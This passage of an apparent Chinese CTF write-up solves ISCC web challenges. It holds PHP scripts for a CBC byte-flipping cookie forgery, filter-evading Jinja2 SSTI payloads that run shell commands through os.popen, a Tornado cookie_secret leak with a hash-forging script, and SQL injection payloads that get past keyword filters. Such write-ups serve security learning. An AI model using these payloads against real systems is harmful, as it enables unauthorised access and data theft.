class="hljs-string">&#x27;username&#x27;</span>];<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;ERROR!&quot;</span>);<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">show_homepage</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&quot;username&quot;</span>]===<span class="hljs-string">&#x27;admin&#x27;</span>&amp;&amp; <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&quot;password&quot;</span>]=== password)<br>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;p&gt;Hello admin&lt;/p&gt;&#x27;</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;p&gt;Flag is &#x27;</span>.flag.<span class="hljs-string">&#x27;&lt;/p&gt;&#x27;</span>;<br>    &#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&quot;password&quot;</span>] == password)<br>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;p&gt;hello &#x27;</span>.<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;username&#x27;</span>].<span class="hljs-string">&#x27;&lt;/p&gt;&#x27;</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;p&gt;You can\&#x27;t see flag&lt;/p&gt;&#x27;</span>;<br>    &#125;<br><span class="hljs-keyword">else</span><br>&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;p&gt;Sorry,password is incorrect&lt;/p&gt;&#x27;</span>;<br>&#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$username</span> = (<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br>    <span class="hljs-variable">$password</span> = (<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$username</span> === <span class="hljs-string">&#x27;admin&#x27;</span>)&#123;<br>        <span class="hljs-keyword">exit</span>(<span class="hljs-string">&#x27;&lt;p&gt;admin are not allowed to login&lt;/p&gt;&#x27;</span>);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-variable">$info</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;username&#x27;</span>=&gt;<span class="hljs-variable">$username</span>,<span class="hljs-string">&#x27;password&#x27;</span>=&gt;<span class="hljs-variable">$password</span>);<br>        login(<span class="hljs-variable">$info</span>);<br>        show_homepage();<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&quot;username&quot;</span>]))&#123;<br>        check_login();<br>        show_homepage();<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;</span><br><span class="hljs-string">&lt;body class=&quot;login-body&quot;&gt;</span><br><span class="hljs-string">                &lt;div id=&quot;wrapper&quot; style = &quot;width:800px; height:200px; overflow:hidden;&quot;&gt;</span><br><span class="hljs-string">                    &lt;img class=&quot;img1&quot; src=&quot;login.bmp&quot;  alt=&quot;login&quot; /&gt;</span><br><span class="hljs-string">                &lt;/div&gt;</span><br><span class="hljs-string">            &lt;/body&gt;&#x27;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>阅读源代码，我们可以知道，只有admin用户才能读取flag，但是admin用户又不允许登录。虽然相互矛盾，由于题目用到了aes的cbc模式加密，所以我们可以利用cbc字节翻转攻击来得到我们想要的明文。</p><p><strong>Bugku Login4</strong>原题，考查CBC字节翻转攻击</p><p>这是组合题,猜测密码是（一）的flag</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">POST<br>username=admix&amp;password=<span class="hljs-number">1</span>SCC_2o2l_KeFuu&amp;submit=Login<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210513123828790.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>题目将用户名密码传入数组并序列化得到</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">a:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;username&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;admil&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;password&quot;</span>;s:<span class="hljs-number">15</span>:<span class="hljs-string">&quot;1SCC_2o2l_KeFuu&quot;</span>;<br></code></pre></td></tr></table></figure><p>接下来进行aes加密，并将得到的cipher和iv进行base64编码放入cookie中(cookie对于攻击者来说可控，所以存在cbc字节翻转攻击)</p><p>明文加密时分组为:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php">a:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;userna</span><br><span class="hljs-string">me&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;admil&quot;</span>;<br>s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;password&quot;</span>;s<br>:<span class="hljs-number">15</span>:<span class="hljs-string">&quot;1SCC_2o2l_K</span><br><span class="hljs-string">eFuu&quot;</span>;&#125;　<br></code></pre></td></tr></table></figure><p>因此我们只需要将”x”字节翻转为”n”即可得到flag。</p><p>根据我们得到的关系，已知只需修改前一组密文即可。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$newcipher</span>[<span class="hljs-number">13</span>]=chr(ord(<span class="hljs-number">13</span>) ^ ord(‘x’) ^ ord(‘n’))<br></code></pre></td></tr></table></figure><p>这时我们就会得到</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">a:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;username&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;admin&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;password&quot;</span>;s:<span class="hljs-number">15</span>:<span class="hljs-string">&quot;1SCC_2o2l_KeFuu&quot;</span>;<br></code></pre></td></tr></table></figure><p>但是由于前一组密文被修改了 所以前一组的明文会出现乱码，因此接下来我们再生成新的iv将前一组明文改回a:2:{s:8:”userna 即可得到flag。</p><p>下面开始操作：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>header(<span class="hljs-string">&quot;Content-Type: text/html;charset=utf-8&quot;</span>);<br><span class="hljs-comment">#计算cipher</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">明文1：a:2:&#123;s:8:&quot;userna//r</span><br><span class="hljs-comment">明文2：me&quot;;s:5:&quot;admix&quot;;//l字母在第14个字节</span><br><span class="hljs-comment">明文3：s:8:&quot;password&quot;;s</span><br><span class="hljs-comment">明文4：:3:&quot;123&quot;;&#125;</span><br><span class="hljs-comment">*/</span><br><span class="hljs-variable">$cipher</span> = base64_decode(urldecode(<span class="hljs-string">&#x27;y2x2UEGxPieluLPfmaOe7HLmJGhUASZGr4AV8o38wLK9LbccTHd125gfvWZpb6lr3T0He7kJ3t7b%2F9JXPj%2FmCm17%2BVl6eIuWs0BqoaXVDL8%3D&#x27;</span>));<br><span class="hljs-variable">$temp</span> = <span class="hljs-variable">$cipher</span>;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment">设密文1[13]=A,解密(密文2)[13]=B,明文2[13]=C,</span><br><span class="hljs-comment">将A修改为A ^ C,则:</span><br><span class="hljs-comment">A ^ B = A ^ C ^ B = B ^ B = 0 = C</span><br><span class="hljs-comment">*/</span><br><span class="hljs-comment">//A  C X</span><br><span class="hljs-variable">$cipher</span>[<span class="hljs-number">13</span>] = chr(ord(<span class="hljs-variable">$cipher</span>[<span class="hljs-number">13</span>]) ^ ord(<span class="hljs-string">&#x27;x&#x27;</span>) ^ ord(<span class="hljs-string">&#x27;n&#x27;</span>));<br><span class="hljs-keyword">echo</span> urlencode(base64_encode(<span class="hljs-variable">$cipher</span>));<br><br><span class="hljs-comment">#Set-Cookie: iv=UlaTx7%2Bd%2B3R0%2BQG0wM0t%2BQ%3D%3D</span><br><span class="hljs-comment">#Set-Cookie: cipher=y2x2UEGxPieluLPfmaOe7HLmJGhUASZGr4AV8o38wLK9LbccTHd125gfvWZpb6lr3T0He7kJ3t7b%2F9JXPj%2FmCm17%2BVl6eIuWs0BqoaXVDL8%3D</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>得到</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">y2x2UEGxPieluLPfmbWe7HLmJGhUASZGr4AV8o38wLK9LbccTHd125gfvWZpb6lr3T0He7kJ3t7b%<span class="hljs-number">2</span>F9JXPj%<span class="hljs-number">2</span>FmCm17%<span class="hljs-number">2</span>BVl6eIuWs0BqoaXVDL8%<span class="hljs-number">3</span>D<br></code></pre></td></tr></table></figure><p>这里提示反序列化失败了<br><img src="https://img-blog.csdnimg.cn/20210513124019323.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>重新计算vi</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">#计算iv</span><br><span class="hljs-variable">$res</span> = base64_decode(<span class="hljs-string">&#x27;udWanuvQSROPYCexu0Urn21lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjE1OiIxU0NDXzJvMmxfS2VGdXUiO30=&#x27;</span>);<span class="hljs-comment">//这里放burp放回的base64数据</span><br><span class="hljs-variable">$iv</span> = base64_decode(urldecode(<span class="hljs-string">&#x27;UlaTx7%2Bd%2B3R0%2BQG0wM0t%2BQ%3D%3D&#x27;</span>)); <span class="hljs-comment">//这里放cookie中的iv  iv=kCoJjjQMy%2BIQATaagMVpbw%3D%3D;</span><br><span class="hljs-variable">$plaintext</span> = <span class="hljs-string">&#x27;a:2:&#123;s:8:&quot;userna&#x27;</span>;<br><span class="hljs-variable">$new_iv</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-number">16</span>; <span class="hljs-variable">$i</span> ++)&#123;<br><span class="hljs-variable">$new_iv</span> = <span class="hljs-variable">$new_iv</span> . chr(ord(<span class="hljs-variable">$iv</span>[<span class="hljs-variable">$i</span>]) ^ ord(<span class="hljs-variable">$res</span>[<span class="hljs-variable">$i</span>]) ^ ord(<span class="hljs-variable">$plaintext</span>[<span class="hljs-variable">$i</span>]));<br>&#125;<br><span class="hljs-keyword">echo</span> urlencode(base64_encode(<span class="hljs-variable">$new_iv</span>));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>得到新的iv值传过去</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">irk7Yy8%<span class="hljs-number">2</span>BiF%<span class="hljs-number">2</span>FBu1N2HvpoBw%<span class="hljs-number">3</span>D%<span class="hljs-number">3</span>D<br></code></pre></td></tr></table></figure><p>最终flag为<br><img src="https://img-blog.csdnimg.cn/20210513124157498.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="lovely-ssti"><a href="#lovely-ssti" class="headerlink" title="lovely ssti"></a>lovely ssti</h2><p>Miao<del>Miao</del>Miao~这里有一只可爱的暹罗猫猫<br>题目入口：<a href="http://39.96.91.106:3010/">http://39.96.91.106:3010/</a></p><p>查看可用字符</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">Payload: ?xiaodouni=&#123;%<span class="hljs-built_in">print</span>%20lipsum|select|string|list%&#125;<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210522174747622.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>没做过多少SSTI方面的题，会单独弄篇博客总结SSTI，暂时先贴一下大师傅们的Payload吧：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs php">?xiaodouyu=<br>&#123;%set%<span class="hljs-number">20</span>xiahua=(config|select|<span class="hljs-keyword">string</span>|<span class="hljs-keyword">list</span>)[<span class="hljs-number">24</span>]%&#125;<br>&#123;%set%<span class="hljs-number">20</span>gb=(xiahua,xiahua,dict(<span class="hljs-class"><span class="hljs-keyword">class</span>=<span class="hljs-title">a</span>)|<span class="hljs-title">join</span>,<span class="hljs-title">xiahua</span>,<span class="hljs-title">xiahua</span>)|<span class="hljs-title">join</span>%&#125;</span><br><span class="hljs-class"></span>&#123;%set%<span class="hljs-number">20</span>ini=(xiahua,xiahua,dict(init=a)|join,xiahua,xiahua)|join%&#125;<br>&#123;%set%<span class="hljs-number">20</span>glo=(xiahua,xiahua,dict(globals=a)|join,xiahua,xiahua)|join%&#125;<br>&#123;%set%<span class="hljs-number">20</span>gm=(xiahua,xiahua,dict(ge=a,titem=a)|join,xiahua,xiahua)|join%&#125;<br>&#123;%set%<span class="hljs-number">20</span>oo=dict(o=a,s=a)|join%&#125;<br>&#123;%%<span class="hljs-number">20</span>set%<span class="hljs-number">20</span>so=oo[::<span class="hljs-number">-1</span>]%&#125;<br>&#123;%set%<span class="hljs-number">20</span>pp=dict(pop=a,ne=b)|join%&#125;<br>&#123;%%<span class="hljs-number">20</span>set%<span class="hljs-number">20</span>opo=pp[::<span class="hljs-number">-1</span>]%&#125;<br>&#123;%set%<span class="hljs-number">20</span>rd=(dict(read=a)|join)%&#125;<br>&#123;%<span class="hljs-keyword">print</span> config|attr(gb)|attr(ini)|attr(glo)|attr(gm)(so)|attr(opo)(<span class="hljs-string">&quot;cat /usr/?????is?here????&quot;</span>)|attr(rd)()%&#125;   <br><br><br>?xiaodouyu=<br>&#123;%set pp=(dict(pop=a))|join%&#125;<br>&#123;%set xiahua=(lipsum|select|<span class="hljs-keyword">string</span>|<span class="hljs-keyword">list</span>)|attr(pp)(<span class="hljs-number">24</span>)%&#125;<br>&#123;%set g=(lipsum|select|<span class="hljs-keyword">string</span>|<span class="hljs-keyword">list</span>)|attr(pp)(<span class="hljs-number">1</span>)%&#125;<br>&#123;%set gb=(xiahua,xiahua,g,dict(bals=a,lo=a)|join,xiahua,xiahua)|join%&#125;<br>&#123;%set gm=(xiahua,xiahua,g,dict(e=a,titem=a)|join,xiahua,xiahua)|join%&#125;<br>&#123;%set bl=(xiahua,xiahua,dict(builtins=a)|join,xiahua,xiahua)|join%&#125;<br>&#123;%set chcr=(lipsum|attr(gb)|attr(gm)(bl))|attr(<span class="hljs-string">&quot;ge&quot;</span><span class="hljs-string">&quot;t&quot;</span>)(<span class="hljs-string">&quot;ch&quot;</span><span class="hljs-string">&quot;r&quot;</span>)%&#125;<br>&#123;%set dian=chcr(<span class="hljs-number">46</span>)%&#125;<br>&#123;%set space=chcr(<span class="hljs-number">32</span>)%&#125;<br>&#123;%set xing=chcr(<span class="hljs-number">42</span>)%&#125;<br>&#123;%set shell=(<span class="hljs-string">&quot;cat &quot;</span>,<span class="hljs-string">&quot;requirements&quot;</span>,dian,<span class="hljs-string">&quot;txt&quot;</span>)|join%&#125;<br>&#123;%set shell2=(<span class="hljs-string">&quot;find / -name &quot;</span>,xing,<span class="hljs-string">&quot;fl&quot;</span>,<span class="hljs-string">&quot;ag&quot;</span>,xing)|join%&#125;<br>&#123;%set shell2=(<span class="hljs-string">&quot;cat /usr/fl&quot;</span>,<span class="hljs-string">&quot;ag&quot;</span>,xiahua,<span class="hljs-string">&quot;is&quot;</span>,xiahua,<span class="hljs-string">&quot;here&quot;</span>,dian,<span class="hljs-string">&quot;txt&quot;</span>)|join%&#125;<br>&#123;&#123; lipsum|attr(gb)|attr(gm)(<span class="hljs-string">&quot;o&quot;</span><span class="hljs-string">&quot;s&quot;</span>)|attr(<span class="hljs-string">&quot;po&quot;</span><span class="hljs-string">&quot;pen&quot;</span>)(shell2)|attr(<span class="hljs-string">&quot;read&quot;</span>)()&#125;&#125;<br><br><br><br>?xiaodouyu=<br>&#123;% set xiahua=(config|<span class="hljs-keyword">string</span>)[<span class="hljs-number">14</span>]%&#125;<br>&#123;% set gb=(xiahua,xiahua,<span class="hljs-string">&quot;globals&quot;</span>,xiahua,xiahua)|join %&#125;<br>&#123;% set bl=(xiahua,xiahua,<span class="hljs-string">&quot;builtins&quot;</span>,xiahua,xiahua)|join %&#125;<br>&#123;% set cr=(lipsum|attr(gb)|attr(<span class="hljs-string">&quot;get&quot;</span>)(bl))[<span class="hljs-string">&quot;ch&quot;</span><span class="hljs-string">&quot;r&quot;</span>] %&#125;<br>&#123;% set dian=cr(<span class="hljs-number">46</span>)%&#125;<br>&#123;% set xing =cr(<span class="hljs-number">42</span>)%&#125;<br>&#123;% set shell=(<span class="hljs-string">&quot;find / -name &quot;</span>,xing,<span class="hljs-string">&quot;fla&quot;</span>,xing)|join%&#125;<br>&#123;% set shell4 = <span class="hljs-string">&quot;cat /usr/fla??is?here?txt&quot;</span>%&#125;<br>&#123;&#123;(lipsum|attr(gb)|attr(<span class="hljs-string">&quot;get&quot;</span>)(<span class="hljs-string">&quot;o&quot;</span><span class="hljs-string">&quot;s&quot;</span>)|attr(<span class="hljs-string">&quot;po&quot;</span><span class="hljs-string">&quot;pen&quot;</span>)(shell4))|attr(<span class="hljs-string">&quot;read&quot;</span>)()&#125;&#125;<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210522173928909.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h1 id="擂台"><a href="#擂台" class="headerlink" title="擂台"></a>擂台</h1><h2 id="tornado"><a href="#tornado" class="headerlink" title="tornado"></a>tornado</h2><p>Tornado 是什么呢？<br>题目入口：<a href="http://39.96.91.106:7060/">http://39.96.91.106:7060</a></p><p>在BUU上做过，是道原题<br><img src="https://img-blog.csdnimg.cn/20210503130235264.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>从三个链接可以得到以下信息：</p><ol><li>flag.txt：flag在/fllllllllllllaaaaaag文件里面</li><li>welcome.txt：根据提示render，可以知道存在模板注入</li><li>hints.txt：md5(cookie_secret+md5(filename))</li></ol><p>当访问/hints.txt，发现url栏变为：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">/file?filename=/hints.txt&amp;filehash=c61a0774797a56fc60854ac778aa3d15<br></code></pre></td></tr></table></figure><p>直接访问fllllllllllllaaaaaag文件</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">Payload: /file?filename=/fllllllllllllaaaaaag<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210503130631121.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>需要计算filehash的值，即md5(cookie_secret+md5(filename))的值。filename已经知道了是/fllllllllllllaaaaaag，下面需要找到cookie_secret。</p><p>Tornado框架的附属文件handler.settings中存在cookie_secret，进行模板注入：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">Payload：error?msg=&#123;&#123;handler.settings&#125;&#125;<br></code></pre></td></tr></table></figure><p>得到cookie_secret的值<br><img src="https://img-blog.csdnimg.cn/20210503130744591.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>直接使用脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<br> <br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">md5value</span>(<span class="hljs-params">s</span>):</span><br>    md5 = hashlib.md5() <br>    md5.update(s) <br>    <span class="hljs-keyword">return</span> md5.hexdigest()<br> <br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">jiami</span>():</span> <br>    filename = <span class="hljs-string">&#x27;/fllllllllllllaaaaaag&#x27;</span><br>    cookie_secret =<span class="hljs-string">&quot;ef57c331-744f-4528-b434-9746317d4f6a&quot;</span><br>    print(<span class="hljs-string">&quot;md5(filename): &quot;</span>+md5value(filename.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)))<br>    x=md5value(filename.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br>    y=cookie_secret+x<br>    print(<span class="hljs-string">&quot;md5(cookie_secret+md5(filename)): &quot;</span>+md5value(y.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)))<br> <br> <br>jiami()<br><br><br><span class="hljs-keyword">import</span> hashlib<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">md5value</span>(<span class="hljs-params">s</span>):</span><br>    md5 = hashlib.md5()<br>    md5.update(s.encode())<br>    <span class="hljs-keyword">return</span> md5.hexdigest()<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">jiami</span>():</span><br>    filename = <span class="hljs-string">&#x27;/fllllllllllllaaaaaag&#x27;</span><br>    cookie_secret =<span class="hljs-string">&quot;ef57c331-744f-4528-b434-9746317d4f6a&quot;</span><br>    print(md5value(cookie_secret + md5value(filename)))<br><br>jiami()<br></code></pre></td></tr></table></figure><p>得到</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">md5(filename): 9395bd4a7a7cae3ce1f6dc17aeb2d2b8<br>md5(cookie_secret+md5(filename)): 1ad9b8e09fbe539bc5a6f2c8bc0ab5db<br></code></pre></td></tr></table></figure><p>最终payload为</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">/file?filename=/fllllllllllllaaaaaag&amp;filehash=1ad9b8e09fbe539bc5a6f2c8bc0ab5db<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210503131310534.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="easyweb"><a href="#easyweb" class="headerlink" title="easyweb"></a>easyweb</h2><p>简单的web<br>题目入口：<a href="http://39.96.91.106:5001/">http://39.96.91.106:5001/</a><br>Flag格式：iscc{XXX}</p><p>查看源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;!--?id--&gt;<br></code></pre></td></tr></table></figure><p>测试一下，id=1，2，3页面均返回数据，其它返回error</p><p>万能密码<code>?id=1&#39; or 1=1#</code>，返回die<br><img src="https://img-blog.csdnimg.cn/20210519163721103.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>测试了一下，使用<code>?id=1&#39;||1=1%23</code>成功返回数据<br><img src="https://img-blog.csdnimg.cn/20210519163828121.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>fuzz一下，过滤了好多</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">select、 union、 or、 ord 、 from、information_schema、空格等<br></code></pre></td></tr></table></figure><p>好多代替空格的都被过滤了，仅剩%0d没有过滤<br>select过滤了，使用seselectlect双写绕过</p><p>得到回显位</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">?id=0<span class="hljs-string">&#x27;%0dununionion%0dselselectect%0d1,2,3%23</span><br><span class="hljs-string"></span><br><span class="hljs-string">#Your Login name:2</span><br><span class="hljs-string">#Your Password:3</span><br></code></pre></td></tr></table></figure><p>爆库名</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">?id=0<span class="hljs-string">&#x27;%0dununionion%0dselselectect%0d1,database(),version()%23</span><br><span class="hljs-string"></span><br><span 